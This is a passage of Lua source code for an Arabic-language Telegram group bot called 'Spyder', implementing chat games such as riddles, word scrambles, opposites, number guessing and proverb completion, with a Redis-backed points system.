Random = {'🍏','🍎','??','🍊','🍋','🍉','🍇','🍓','??','🍒','🍑','🍍','🥥','🥝','🍅','🍆','🥑','🥦','🥒','🌶','🌽','🥕','🥔','🥖','🥐','🍞','🥨','🍟','🧀','🥚','🍳','🥓','🥩','🍗','🍖','🌭','🍔','🍠','🍕','🥪','🥙','☕️','🍵','🥤','🍶','🍺','🍻','🏀','⚽️','🏈','⚾️','🎾','🏐','🏉','🎱','🏓','🏸','🥅','🎰','🎮','🎳','🎯','🎲','🎻','??','🎺','🥁','??','🎼','🎧','🎤','🎬','🎨','🎭','🎪','🎟','🎫','🎗','🏵','🎖','🏆','🥌','🛷','🚗','🚌','🏎','🚓','🚑','🚚','🚛','🚜','🇮🇶','⚔','🛡','🔮','🌡','💣','📌','📍','📓','📗','📂','📅','📪','☑','📬','📭','⏰','📺','🎚','☎️','📡'}
SM = Random[math.random(#Random)]
redis:set('Spyder:'..bot_id..'Random:Sm'..msg.chat_id_,SM)
send(msg.chat_id_, msg.id_,'⌔︙ اسرع واحد يدز هذا السمايل ? ↫ {`'..SM..'`}')
return false
end
end
if text == ''..(redis:get('Spyder:'..bot_id..'Random:Sm'..msg.chat_id_) or '')..'' and not redis:get('Spyder:'..bot_id..'Set:Sma'..msg.chat_id_) then
if not redis:get('Spyder:'..bot_id..'Set:Sma'..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'⌔︙ الف مبروك لقد فزت \n⌔︙ للعب مره اخره ارسل ↫{ سمايل , سمايلات }')
redis:incrby('Spyder:'..bot_id..'NUM:GAMES'..msg.chat_id_..msg.sender_user_id_, 1)  
end
redis:set('Spyder:'..bot_id..'Set:Sma'..msg.chat_id_,true)
return false
end 
if text == 'الاسرع' or text == 'ترتيب' then
if redis:get('Spyder:'..bot_id..'Lock:Games'..msg.chat_id_) then
redis:del('Spyder:'..bot_id..'Speed:Tr'..msg.chat_id_)
KlamSpeed = {'سحور','سياره','استقبال','قنفه','ايفون','بزونه','مطبخ','كرستيانو','دجاجه','مدرسه','الوان','غرفه','ثلاجه','كهوه','سفينه','العراق','محطه','طياره','رادار','منزل','مستشفى','كهرباء','تفاحه','اخطبوط','سلمون','فرنسا','برتقاله','تفاح','مطرقه','بتيته','لهانه','شباك','باص','سمكه','ذباب','تلفاز','حاسوب','انترنيت','ساحه','جسر'};
name = KlamSpeed[math.random(#KlamSpeed)]
redis:set('Spyder:'..bot_id..'Klam:Speed'..msg.chat_id_,name)
name = string.gsub(name,'سحور','س ر و ح')
name = string.gsub(name,'سياره','ه ر س ي ا')
name = string.gsub(name,'استقبال','ل ب ا ت ق س ا')
name = string.gsub(name,'قنفه','ه ق ن ف')
name = string.gsub(name,'ايفون','و ن ف ا')
name = string.gsub(name,'بزونه','ز و ه ن')
name = string.gsub(name,'مطبخ','خ ب ط م')
name = string.gsub(name,'كرستيانو','س ت ا ن و ك ر ي')
name = string.gsub(name,'دجاجه','ج ج ا د ه')
name = string.gsub(name,'مدرسه','ه م د ر س')
name = string.gsub(name,'الوان','ن ا و ا ل')
name = string.gsub(name,'غرفه','غ ه ر ف')
name = string.gsub(name,'ثلاجه','ج ه ت ل ا')
name = string.gsub(name,'كهوه','ه ك ه و')
name = string.gsub(name,'سفينه','ه ن ف ي س')
name = string.gsub(name,'العراق','ق ع ا ل ر ا')
name = string.gsub(name,'محطه','ه ط م ح')
name = string.gsub(name,'طياره','ر ا ط ي ه')
name = string.gsub(name,'رادار','ر ا ر ا د')
name = string.gsub(name,'منزل','ن ز م ل')
name = string.gsub(name,'مستشفى','ى ش س ف ت م')
name = string.gsub(name,'كهرباء','ر ب ك ه ا ء')
name = string.gsub(name,'تفاحه','ح ه ا ت ف')
name = string.gsub(name,'اخطبوط','ط ب و ا خ ط')
name = string.gsub(name,'سلمون','ن م و ل س')
name = string.gsub(name,'فرنسا','ن ف ر س ا')
name = string.gsub(name,'برتقاله','ر ت ق ب ا ه ل')
name = string.gsub(name,'تفاح','ح ف ا ت')
name = string.gsub(name,'مطرقه','ه ط م ر ق')
name = string.gsub(name,'بتيته','ب ت ت ي ه')
name = string.gsub(name,'لهانه','ه ن ل ه ل')
name = string.gsub(name,'شباك','ب ش ا ك')
name = string.gsub(name,'باص','ص ا ب')
name = string.gsub(name,'سمكه','ك س م ه')
name = string.gsub(name,'ذباب','ب ا ب ذ')
name = string.gsub(name,'تلفاز','ت ف ل ز ا')
name = string.gsub(name,'حاسوب','س ا ح و ب')
name = string.gsub(name,'انترنيت','ا ت ن ر ن ي ت')
name = string.gsub(name,'ساحه','ح ا ه س')
name = string.gsub(name,'جسر','ر ج س')
send(msg.chat_id_, msg.id_,'⌔︙ اسرع واحد يرتبها ↫ {'..name..'}')
return false
end
end
------------------------------------------------------------------------
if text == ''..(redis:get('Spyder:'..bot_id..'Klam:Speed'..msg.chat_id_) or '')..'' and not redis:get('Spyder:'..bot_id..'Speed:Tr'..msg.chat_id_) then
if not redis:get('Spyder:'..bot_id..'Speed:Tr'..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'⌔︙ الف مبروك لقد فزت \n⌔︙ للعب مره اخره ارسل ↫{ الاسرع , ترتيب }')
redis:incrby('Spyder:'..bot_id..'NUM:GAMES'..msg.chat_id_..msg.sender_user_id_, 1)  
end
redis:set('Spyder:'..bot_id..'Speed:Tr'..msg.chat_id_,true)
end 

if text == 'حزوره' then
if redis:get('Spyder:'..bot_id..'Lock:Games'..msg.chat_id_) then
redis:del('Spyder:'..bot_id..'Set:Hzora'..msg.chat_id_)
Hzora = {'الجرس','عقرب الساعه','السمك','المطر','5','الكتاب','البسمار','7','الكعبه','بيت الشعر','لهانه','انا','امي','الابره','الساعه','22','خطأ','كم الساعه','البيتنجان','البيض','المرايه','الضوء','الهواء','الضل','العمر','القلم','المشط','الحفره','البحر','الثلج','الاسفنج','الصوت','بلم'};
name = Hzora[math.random(#Hzora)]
redis:set('Spyder:'..bot_id..'Klam:Hzor'..msg.chat_id_,name)
name = string.gsub(name,'الجرس','شيئ اذا لمسته صرخ ما هوه ؟')
name = string.gsub(name,'عقرب الساعه','اخوان لا يستطيعان تمضيه اكثر من دقيقه معا فما هما ؟')
name = string.gsub(name,'السمك','ما هو الحيوان الذي لم يصعد الى سفينة نوح عليه السلام ؟')
name = string.gsub(name,'المطر','شيئ يسقط على رأسك من الاعلى ولا يجرحك فما هو ؟')
name = string.gsub(name,'5','ما العدد الذي اذا ضربته بنفسه واضفت عليه 5 يصبح ثلاثين ')
name = string.gsub(name,'الكتاب','ما الشيئ الذي له اوراق وليس له جذور ؟')
name = string.gsub(name,'البسمار','ما هو الشيئ الذي لا يمشي الا بالضرب ؟')
name = string.gsub(name,'7','عائله مؤلفه من 6 بنات واخ لكل منهن .فكم عدد افراد العائله ')
name = string.gsub(name,'الكعبه','ما هو الشيئ الموجود وسط مكة ؟')
name = string.gsub(name,'بيت الشعر','ما هو البيت الذي ليس فيه ابواب ولا نوافذ ؟ ')
name = string.gsub(name,'لهانه','وحده حلوه ومغروره تلبس مية تنوره .من هيه ؟ ')
name = string.gsub(name,'انا','ابن امك وابن ابيك وليس باختك ولا باخيك فمن يكون ؟')
name = string.gsub(name,'امي','اخت خالك وليست خالتك من تكون ؟ ')
name = string.gsub(name,'الابره','ما هو الشيئ الذي كلما خطا خطوه فقد شيئا من ذيله ؟ ')
name = string.gsub(name,'الساعه','ما هو الشيئ الذي يقول الصدق ولكنه اذا جاع كذب ؟')
name = string.gsub(name,'22','كم مره ينطبق عقربا الساعه على بعضهما في اليوم الواحد ')
name = string.gsub(name,'خطأ','ما هي الكلمه الوحيده التي تلفض خطأ دائما ؟ ')
name = string.gsub(name,'كم الساعه','ما هو السؤال الذي تختلف اجابته دائما ؟')
name = string.gsub(name,'البيتنجان','جسم اسود وقلب ابيض وراس اخظر فما هو ؟')
name = string.gsub(name,'البيض','ماهو الشيئ الذي اسمه على لونه ؟')
name = string.gsub(name,'المرايه','ارى كل شيئ من دون عيون من اكون ؟ ')
name = string.gsub(name,'الضوء','ما هو الشيئ الذي يخترق الزجاج ولا يكسره ؟')
name = string.gsub(name,'الهواء','ما هو الشيئ الذي يسير امامك ولا تراه ؟')
name = string.gsub(name,'الضل','ما هو الشيئ الذي يلاحقك اينما تذهب ؟ ')
name = string.gsub(name,'العمر','ما هو الشيء الذي كلما طال قصر ؟ ')
name = string.gsub(name,'القلم','ما هو الشيئ الذي يكتب ولا يقرأ ؟')
name = string.gsub(name,'المشط','له أسنان ولا يعض ما هو ؟ ')
name = string.gsub(name,'الحفره','ما هو الشيئ اذا أخذنا منه ازداد وكبر ؟')
name = string.gsub(name,'البحر','ما هو الشيئ الذي يرفع اثقال ولا يقدر يرفع مسمار ؟')
name = string.gsub(name,'الثلج','انا ابن الماء فان تركوني في الماء مت فمن انا ؟')
name = string.gsub(name,'الاسفنج','كلي ثقوب ومع ذالك احفض الماء فمن اكون ؟')
name = string.gsub(name,'الصوت','اسير بلا رجلين ولا ادخل الا بالاذنين فمن انا ؟')
name = string.gsub(name,'بلم','حامل ومحمول نصف ناشف ونصف مبلول فمن اكون ؟ ')
send(msg.chat_id_, msg.id_,'⌔︙ اسرع واحد يحل الحزوره ↓\n {'..name..'}')
return false
end
end
------------------------------------------------------------------------
if text == ''..(redis:get('Spyder:'..bot_id..'Klam:Hzor'..msg.chat_id_) or '')..'' and not redis:get('Spyder:'..bot_id..'Set:Hzora'..msg.chat_id_) then
if not redis:get('Spyder:'..bot_id..'Set:Hzora'..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'⌔︙ الف مبروك لقد فزت \n⌔︙ للعب مره اخره ارسل ↫{ حزوره }')
redis:incrby('Spyder:'..bot_id..'NUM:GAMES'..msg.chat_id_..msg.sender_user_id_, 1)  
end
redis:set('Spyder:'..bot_id..'Set:Hzora'..msg.chat_id_,true)
end 

if text == 'معاني' then
if redis:get('Spyder:'..bot_id..'Lock:Games'..msg.chat_id_) then
redis:del('Spyder:'..bot_id..'Set:Maany'..msg.chat_id_)
Maany_Rand = {'قرد','دجاجه','بطريق','ضفدع','بومه','نحله','ديك','جمل','بقره','دولفين','تمساح','قرش','نمر','اخطبوط','سمكه','خفاش','اسد','فأر','ذئب','فراشه','عقرب','زرافه','قنفذ','تفاحه','باذنجان'}
name = Maany_Rand[math.random(#Maany_Rand)]
redis:set('Spyder:'..bot_id..'Maany'..msg.chat_id_,name)
name = string.gsub(name,'قرد','🐒')
name = string.gsub(name,'دجاجه','🐔')
name = string.gsub(name,'بطريق','🐧')
name = string.gsub(name,'ضفدع','🐸')
name = string.gsub(name,'بومه','🦉')
name = string.gsub(name,'نحله','🐝')
name = string.gsub(name,'ديك','🐓')
name = string.gsub(name,'جمل','🐫')
name = string.gsub(name,'بقره','🐄')
name = string.gsub(name,'دولفين','🐬')
name = string.gsub(name,'تمساح','🐊')
name = string.gsub(name,'قرش','🦈')
name = string.gsub(name,'نمر','🐅')
name = string.gsub(name,'اخطبوط','🐙')
name = string.gsub(name,'سمكه','🐟')
name = string.gsub(name,'خفاش','🦇')
name = string.gsub(name,'اسد','🦁')
name = string.gsub(name,'فأر','🐭')
name = string.gsub(name,'ذئب','🐺')
name = string.gsub(name,'فراشه','🦋')
name = string.gsub(name,'عقرب','🦂')
name = string.gsub(name,'زرافه','🦒')
name = string.gsub(name,'قنفذ','🦔')
name = string.gsub(name,'تفاحه','🍎')
name = string.gsub(name,'باذنجان','🍆')
send(msg.chat_id_, msg.id_,'⌔︙ اسرع واحد يدز معنى السمايل ↫ {'..name..'}')
return false
end
end
------------------------------------------------------------------------
if text == ''..(redis:get('Spyder:'..bot_id..'Maany'..msg.chat_id_) or '')..'' and not redis:get('Spyder:'..bot_id..'Set:Maany'..msg.chat_id_) then
if not redis:get('Spyder:'..bot_id..'Set:Maany'..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'⌔︙ الف مبروك لقد فزت \n⌔︙ للعب مره اخره ارسل ↫{ معاني }')
redis:incrby('Spyder:'..bot_id..'NUM:GAMES'..msg.chat_id_..msg.sender_user_id_, 1)  
end
redis:set('Spyder:'..bot_id..'Set:Maany'..msg.chat_id_,true)
end 
if text == 'العكس' then
if redis:get('Spyder:'..bot_id..'Lock:Games'..msg.chat_id_) then
redis:del('Spyder:'..bot_id..'Set:Aks'..msg.chat_id_)
katu = {'باي','فهمت','موزين','اسمعك','احبك','موحلو','نضيف','حاره','ناصي','جوه','سريع','ونسه','طويل','سمين','ضعيف','شريف','شجاع','رحت','عدل','نشيط','شبعان','موعطشان','خوش ولد','اني','هادئ'}
name = katu[math.random(#katu)]
redis:set('Spyder:'..bot_id..'Set:Aks:Game'..msg.chat_id_,name)
name = string.gsub(name,'باي','هلو')
name = string.gsub(name,'فهمت','مافهمت')
name = string.gsub(name,'موزين','زين')
name = string.gsub(name,'اسمعك','ماسمعك')
name = string.gsub(name,'احبك','ماحبك')
name = string.gsub(name,'موحلو','حلو')
name = string.gsub(name,'نضيف','وصخ')
name = string.gsub(name,'حاره','بارده')
name = string.gsub(name,'ناصي','عالي')
name = string.gsub(name,'جوه','فوك')
name = string.gsub(name,'سريع','بطيء')
name = string.gsub(name,'ونسه','ضوجه')
name = string.gsub(name,'طويل','قزم')
name = string.gsub(name,'سمين','ضعيف')
name = string.gsub(name,'ضعيف','قوي')
name = string.gsub(name,'شريف','كواد')
name = string.gsub(name,'شجاع','جبان')
name = string.gsub(name,'رحت','اجيت')
name = string.gsub(name,'عدل','ميت')
name = string.gsub(name,'نشيط','كسول')
name = string.gsub(name,'شبعان','جوعان')
name = string.gsub(name,'موعطشان','عطشان')
name = string.gsub(name,'خوش ولد','موخوش ولد')
name = string.gsub(name,'اني','مطي')
name = string.gsub(name,'هادئ','عصبي')
send(msg.chat_id_, msg.id_,'⌔︙ اسرع واحد يدز العكس ↫ {'..name..'}')
return false
end
end
------------------------------------------------------------------------
if text == ''..(redis:get('Spyder:'..bot_id..'Set:Aks:Game'..msg.chat_id_) or '')..'' and not redis:get('Spyder:'..bot_id..'Set:Aks'..msg.chat_id_) then
if not redis:get('Spyder:'..bot_id..'Set:Aks'..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'⌔︙ الف مبروك لقد فزت \n⌔︙ للعب مره اخره ارسل ↫{ العكس }')
redis:incrby('Spyder:'..bot_id..'NUM:GAMES'..msg.chat_id_..msg.sender_user_id_, 1)  
end
redis:set('Spyder:'..bot_id..'Set:Aks'..msg.chat_id_,true)
end 

if redis:get('Spyder:'..bot_id.."GAME:TKMEN" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then  
if text and text:match("^(%d+)$") then
local NUM = text:match("^(%d+)$")
if tonumber(NUM) > 20 then
send(msg.chat_id_, msg.id_,"⌔︙عذرآ لا يمكنك تخمين عدد اكبر من ال { 20 } خمن رقم ما بين ال{ 1 و 20 }\n")
return false  end 
local GETNUM = redis:get('Spyder:'..bot_id.."GAMES:NUM"..msg.chat_id_)
if tonumber(NUM) == tonumber(GETNUM) then
redis:del('Spyder:'..bot_id..'SADD:NUM'..msg.chat_id_..msg.sender_user_id_)
redis:del('Spyder:'..bot_id.."GAME:TKMEN" .. msg.chat_id_ .. "" .. msg.sender_user_id_)   
redis:incrby('Spyder:'..bot_id..'NUM:GAMES'..msg.chat_id_..msg.sender_user_id_,5)  
send(msg.chat_id_, msg.id_,'⌔︙ مبروك فزت ويانه وخمنت الرقم الصحيح\n⌔︙ تم اضافة { 5 } من النقاط \n')
elseif tonumber(NUM) ~= tonumber(GETNUM) then
redis:incrby('Spyder:'..bot_id..'SADD:NUM'..msg.chat_id_..msg.sender_user_id_,1)
if tonumber(redis:get('Spyder:'..bot_id..'SADD:NUM'..msg.chat_id_..msg.sender_user_id_)) >= 3 then
redis:del('Spyder:'..bot_id..'SADD:NUM'..msg.chat_id_..msg.sender_user_id_)
redis:del('Spyder:'..bot_id.."GAME:TKMEN" .. msg.chat_id_ .. "" .. msg.sender_user_id_)   
send(msg.chat_id_, msg.id_,'⌔︙ اوبس لقد خسرت في اللعبه \n⌔︙حظآ اوفر في المره القادمه \n⌔︙ كان الرقم الذي تم تخمينه { '..GETNUM..' }')
else
send(msg.chat_id_, msg.id_,'⌔︙اوبس تخمينك خطأ \n⌔︙ ارسل رقم تخمنه مره اخرى ')
end
end
end
end
if text == 'خمن' or text == 'تخمين' then   
if redis:get('Spyder:'..bot_id..'Lock:Games'..msg.chat_id_) then
Num = math.random(1,20)
redis:set('Spyder:'..bot_id.."GAMES:NUM"..msg.chat_id_,Num) 
send(msg.chat_id_, msg.id_,'\n⌔︙اهلا بك عزيزي في لعبة التخمين :\nٴ━━━━━━━━━━\n'..'⌔︙ ملاحظه لديك { 3 } محاولات فقط فكر قبل ارسال تخمينك \n\n'..'⌔︙ سيتم تخمين عدد ما بين ال {1 و 20} اذا تعتقد انك يمكنك الفوز جرب واللعب الان ؟ ')
redis:setex('Spyder:'..bot_id.."GAME:TKMEN" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 100, true)  
return false  
end
end

if redis:get('Spyder:'..bot_id.."SET:GAME" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then  
if text and text:match("^(%d+)$") then
local NUM = text:match("^(%d+)$")
if tonumber(NUM) > 6 then
send(msg.chat_id_, msg.id_,"⌔︙عذرا لا يوجد سواء { 6 } اختيارات فقط ارسل اختيارك مره اخرى\n")
return false  end 
local GETNUM = redis:get('Spyder:'..bot_id.."Games:Bat"..msg.chat_id_)
if tonumber(NUM) == tonumber(GETNUM) then
redis:del('Spyder:'..bot_id.."SET:GAME" .. msg.chat_id_ .. "" .. msg.sender_user_id_)   
send(msg.chat_id_, msg.id_,'⌔︙ مبروك فزت وطلعت المحيبس بل ايد رقم { '..NUM..' }\n🎊︙ لقد حصلت على { 3 }من نقاط يمكنك استبدالهن برسائل ')
redis:incrby('Spyder:'..bot_id..'NUM:GAMES'..msg.chat_id_..msg.sender_user_id_,3)  
elseif tonumber(NUM) ~= tonumber(GETNUM) then
redis:del('Spyder:'..bot_id.."SET:GAME" .. msg.chat_id_ .. "" .. msg.sender_user_id_)   
send(msg.chat_id_, msg.id_,'⌔︙ للاسف لقد خسرت \n⌔︙المحيبس بل ايد رقم { '..GETNUM..' }\n💥︙ حاول مره اخرى للعثور على المحيبس')
end
end
end

if text == 'محيبس' or text == 'بات' then
if redis:get('Spyder:'..bot_id..'Lock:Games'..msg.chat_id_) then   
Num = math.random(1,6)
redis:set('Spyder:'..bot_id.."Games:Bat"..msg.chat_id_,Num) 
TEST = [[
*➀       ➁     ➂      ➃      ➄     ➅
↓      ↓     ↓      ↓     ↓     ↓
👊 ‹› 👊 ‹› 👊 ‹› 👊 ‹› 👊 ‹› 👊
⌔︙ اختر لأستخراج المحيبس الايد التي تحمل المحيبس 
⌔︙ الفائز يحصل على { 3 } من النقاط *
]]
send(msg.chat_id_, msg.id_,TEST)
redis:setex('Spyder:'..bot_id.."SET:GAME" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 100, true)  
return false  
end
end

------------------------------------------------------------------------
if text == 'المختلف' then
if redis:get('Spyder:'..bot_id..'Lock:Games'..msg.chat_id_) then
mktlf = {'😸','☠','🐼','🐇','🌑','🌚','⭐️','✨','⛈','🌥','⛄️','👨‍🔬','👨‍💻','👨‍🔧','👩‍🍳','🧚‍♀','🧜‍♂','🧝‍♂','🙍‍♂','🧖‍♂','👬','👨‍👨‍👧','🕒','🕤','⌛️','📅',};
name = mktlf[math.random(#mktlf)]
redis:del('Spyder:'..bot_id..'Set:Moktlf:Bot'..msg.chat_id_)
redis:set('Spyder:'..bot_id..':Set:Moktlf'..msg.chat_id_,name)
name = string.gsub(name,'😸','😹😹😹😹😹😹😹??😸😹😹??😹')
name = string.gsub(name,'☠','💀💀💀💀💀??💀☠💀💀💀💀💀')
name = string.gsub(name,'🐼','👻👻👻🐼👻👻👻👻👻👻👻')
name = string.gsub(name,'🐇','🕊🕊🕊🕊🕊🐇🕊🕊🕊🕊')
name = string.gsub(name,'🌑','🌚🌚🌚🌚🌚🌑🌚🌚🌚')
name = string.gsub(name,'🌚','🌑🌑🌑🌑🌑🌚🌑🌑🌑')
name = string.gsub(name,'⭐️','🌟🌟🌟🌟🌟🌟🌟🌟⭐️🌟🌟🌟')
name = string.gsub(name,'✨','💫💫💫💫💫✨💫💫💫💫')
name = string.gsub(name,'⛈','🌨🌨🌨🌨🌨⛈🌨🌨🌨🌨')
name = string.gsub(name,'🌥','⛅️⛅️⛅️⛅️⛅️⛅️🌥⛅️⛅️⛅️⛅️')
name = string.gsub(name,'⛄️','☃☃☃☃☃☃⛄️☃☃☃☃')
name = string.gsub(name,'👨‍🔬','👩‍🔬👩‍🔬👩‍🔬👩‍🔬👩‍🔬??‍🔬👩‍🔬👩‍🔬👨‍🔬👩‍🔬👩‍🔬👩‍🔬')
name = string.gsub(name,'👨‍💻','👩‍💻👩‍💻👩‍‍💻👩‍‍💻👩‍💻👨‍💻👩‍💻👩‍💻👩‍💻')
name = string.gsub(name,'👨‍🔧','👩‍🔧👩‍🔧👩‍🔧👩‍🔧👩‍🔧👩‍🔧👨‍🔧👩‍🔧')
name = string.gsub(name,'??‍🍳','👨‍🍳👨‍🍳👨‍🍳👨‍🍳👨‍🍳👩‍🍳👨‍🍳👨‍🍳👨‍🍳')
name = string.gsub(name,'🧚‍♀','🧚‍♂🧚‍♂🧚‍♂🧚‍♂🧚‍♀🧚‍♂🧚‍♂')
name = string.gsub(name,'🧜‍♂','🧜‍♀🧜‍♀🧜‍♀🧜‍♀🧜‍♀🧚‍♂🧜‍♀🧜‍♀🧜‍♀')
name = string.gsub(name,'🧝‍♂','🧝‍♀🧝‍♀🧝‍♀🧝‍♀🧝‍♀🧝‍♂🧝‍♀🧝‍♀🧝‍♀')
name = string.gsub(name,'🙍‍♂️','🙎‍♂️🙎‍♂️🙎‍♂️🙎‍♂️??‍♂️🙍‍♂️🙎‍♂️??‍♂️🙎‍♂️')
name = string.gsub(name,'🧖‍♂️','🧖‍♀️🧖‍♀️🧖‍♀️🧖‍♀️🧖‍♀️🧖‍♂️🧖‍♀️🧖‍♀️🧖‍♀️🧖‍♀️')
name = string.gsub(name,'👬','👭👭👭👭👭👬👭👭👭')
name = string.gsub(name,'👨‍👨‍👧','👨‍👨‍👦👨‍👨‍👦👨‍👨‍👦👨‍👨‍👦👨‍👨‍👧👨‍👨‍👦👨‍👨‍👦')
name = string.gsub(name,'🕒','🕒🕒🕒🕒🕒🕒🕓🕒🕒🕒')
name = string.gsub(name,'🕤','🕥🕥🕥🕥🕥🕤🕥🕥🕥')
name = string.gsub(name,'⌛️','⏳⏳⏳⏳⏳⏳⌛️⏳⏳')
name = string.gsub(name,'📅','📆📆📆📆📆??📅📆📆')
send(msg.chat_id_, msg.id_,'⌔︙ اسرع واحد يدز الاختلاف ↫ {'..name..'}')
return false
end
end
------------------------------------------------------------------------
if text == ''..(redis:get('Spyder:'..bot_id..':Set:Moktlf'..msg.chat_id_) or '')..'' then 
if not redis:get('Spyder:'..bot_id..'Set:Moktlf:Bot'..msg.chat_id_) then 
redis:del('Spyder:'..bot_id..':Set:Moktlf'..msg.chat_id_)
send(msg.chat_id_, msg.id_,'⌔︙ الف مبروك لقد فزت \n⌔︙ للعب مره اخره ارسل ↫{ المختلف }')
redis:incrby('Spyder:'..bot_id..'NUM:GAMES'..msg.chat_id_..msg.sender_user_id_, 1)  
end
redis:set('Spyder:'..bot_id..'Set:Moktlf:Bot'..msg.chat_id_,true)
end
------------------------------------------------------------------------
if text == 'امثله' and redis:get('Spyder:'..bot_id..'Lock:Games'..msg.chat_id_) then
mthal = {'جوز','ضراطه','الحبل','الحافي','شقره','بيدك','سلايه','النخله','الخيل','حداد','المبلل','يركص','قرد','العنب','العمه','الخبز','بالحصاد','شهر','شكه','يكحله',};
name = mthal[math.random(#mthal)]
redis:set('Spyder:'..bot_id..'Set:Amth'..msg.chat_id_,name)
redis:del('Spyder:'..bot_id..'Set:Amth:Bot'..msg.chat_id_)
name = string.gsub(name,'جوز','ينطي____للماعده سنون')
name = string.gsub(name,'ضراطه','الي يسوق المطي يتحمل___')
name = string.gsub(name,'بيدك','اكل___محد يفيدك')
name = string.gsub(name,'الحافي','تجدي من___نعال')
name = string.gsub(name,'شقره','مع الخيل يا___')
name = string.gsub(name,'النخله','الطول طول___والعقل عقل الصخلة')
name = string.gsub(name,'سلايه','بالوجه امراية وبالظهر___')
name = string.gsub(name,'الخيل','من قلة___شدو على الچلاب سروج')
name = string.gsub(name,'حداد','موكل من صخم وجهه كال آني___')
name = string.gsub(name,'المبلل','___ما يخاف من المطر')
name = string.gsub(name,'الحبل','اللي تلدغة الحية يخاف من جرة___')
name = string.gsub(name,'يركص','المايعرف___يكول الكاع عوجه')
name = string.gsub(name,'العنب','المايلوح___يكول حامض')
name = string.gsub(name,'العمه','___إذا حبت الچنة ابليس يدخل الجنة')
name = string.gsub(name,'الخبز','انطي___للخباز حتى لو ياكل نصه')
name = string.gsub(name,'باحصاد','اسمة___ومنجله مكسور')
name = string.gsub(name,'شهر','امشي__ولا تعبر نهر')
name = string.gsub(name,'شكه','يامن تعب يامن__يا من على الحاضر لكة')
name = string.gsub(name,'القرد','__بعين امه غزال')
name = string.gsub(name,'يكحله','اجه___عماها')
send(msg.chat_id_, msg.id_,'⌔︙اسرع واحد يكمل المثل ~ {'..name..'}')
return false
end
------------------------------------------------------------------------
if text == ''..(redis:get('Spyder:'..bot_id..'Set:Amth'..msg.chat_id_) or '')..'' then 
if not redis:get('Spyder:'..bot_id..'Set:Amth:Bot'..msg.chat_id_) then 
redis:del('Spyder:'..bot_id..'Set:Amth'..msg.chat_id_)
send(msg.chat_id_, msg.id_,'⌔︙ الف مبروك لقد فزت \n⌔︙ للعب مره اخره ارسل ↫{ امثله }')
redis:incrby('Spyder:'..bot_id..'NUM:GAMES'..msg.chat_id_..msg.sender_user_id_, 1)  
end
redis:set('Spyder:'..bot_id..'Set:Amth:Bot'..msg.chat_id_,true)
end
if text == 'تعطيل الالعاب' and Owners(msg) then  
send(msg.chat_id_, msg.id_, '⌔︙بواسطة :  ['..Get_Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'Spyder')..')\n⌔︙ تم تعطيل الالعاب')
redis:del('Spyder:'..bot_id..'Lock:Games'..msg.chat_id_)
end
if text == 'تفعيل الالعاب' and Owners(msg) then  
send(msg.chat_id_, msg.id_, '⌔︙بواسطة :  ['..Get_Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'Spyder')..')\n⌔︙ تم تفعيل الالعاب')
redis:set('Spyder:'..bot_id..'Lock:Games'..msg.chat_id_, true)
end
if text == 'نقاطي' or text == 'نقاطي' then 
local Num = redis:get('Spyder:'..bot_id..'NUM:GAMES'..msg.chat_id_..msg.sender_user_id_) or 0
if Num == 0 then 
Text = '⌔︙ لم تلعب اي لعبه للحصول على نقاط'
else
Text = '⌔︙ عدد نقاط التي رحبتها هي *↫ { '..Num..' } مجوهره *'
end
send(msg.chat_id_, msg.id_,Text) 
end

if text and text:match("^بيع نقاطي (%d+)$") or text and text:match("^بيع نقاطي (%d+)$") then
local NUMPY = text:match("^بيع نقاطي (%d+)$") or text:match("^بيع نقاطي (%d+)$") 
if tonumber(NUMPY) == tonumber(0) then
send(msg.chat_id_,msg.id_,"\n*⌔︙ لا يمكنني البيع اقل من 1 *") 
return false 
end
if tonumber(redis:get('Spyder:'..bot_id..'NUM:GAMES'..msg.chat_id_..msg.sender_user_id_)) == tonumber(0) then
send(msg.chat_id_,msg.id_,'⌔︙ ليس لديك نقاط من الالعاب \n⌔︙اذا كنت تريد ربح النقاط \n⌔︙ ارسل الالعاب وابدأ اللعب ! ') 
else
local NUM_GAMES = redis:get('Spyder:'..bot_id..'NUM:GAMES'..msg.chat_id_..msg.sender_user_id_)
if tonumber(NUMPY) > tonumber(NUM_GAMES) then
send(msg.chat_id_,msg.id_,'\n⌔︙ ليس لديك نقاط بهذا العدد \n⌔︙لزيادة نقاطك في اللعبه \n⌔︙ ارسل الالعاب وابدأ اللعب !') 
return false 
end
local NUMNKO = (NUMPY * 50)
redis:decrby('Spyder:'..bot_id..'NUM:GAMES'..msg.chat_id_..msg.sender_user_id_,NUMPY)  
redis:incrby('Spyder:'..bot_id..'Msg_User'..msg.chat_id_..':'..msg.sender_user_id_,NUMNKO)  
send(msg.chat_id_,msg.id_,'⌔︙ تم خصم *↫ { '..NUMPY..' }* من نقاطك \n⌔︙ وتم اضافة* ↫ { '..(NUMPY * 50)..' } رساله الى رسالك *')
end 
return false 
end
if text ==("مسح") and Mod(msg) and tonumber(msg.reply_to_message_id_) > 0 then
DeleteMessage(msg.chat_id_,{[0] = tonumber(msg.reply_to_message_id_),msg.id_})   
end   
if redis:get('Spyder:'..bot_id.."numadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then 
if text and text:match("^الغاء$") then 
redis:del('Spyder:'..bot_id..'id:user'..msg.chat_id_)  
send(msg.chat_id_, msg.id_, "⌔︙ تم الغاء الامر ") 
redis:del('Spyder:'..bot_id.."numadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
return false  
end 
redis:del('Spyder:'..bot_id.."numadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
local numadded = string.match(text, "(%d+)") 
local iduserr = redis:get('Spyder:'..bot_id..'id:user'..msg.chat_id_)  
redis:del('Spyder:'..bot_id..'Msg_User'..msg.chat_id_..':'..msg.sender_user_id_) 
redis:incrby('Spyder:'..bot_id..'Msg_User'..msg.chat_id_..':'..iduserr,numadded)  
